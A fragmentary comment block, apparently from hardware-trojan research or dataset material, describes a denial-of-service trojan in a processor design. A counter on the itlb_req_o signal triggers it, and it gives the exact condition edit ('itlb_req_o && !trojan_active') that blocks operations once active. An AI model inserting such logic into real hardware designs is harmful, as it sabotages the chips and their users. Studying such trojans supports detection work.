 ...
 * 
 * Description:
 *   Disables operations by blocking itlb_req_o control signal
 *   
 * Trigger: Counter on itlb_req_o
 * Payload: Block itlb_req_o when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block itlb_req_o when trojan is active
//
// IMPORTANT: itlb_req_o is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (itlb_req_o && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: itlb_req_o && 0 = 0 (always false)
//   All operations controlled by itlb_req_o are blocked
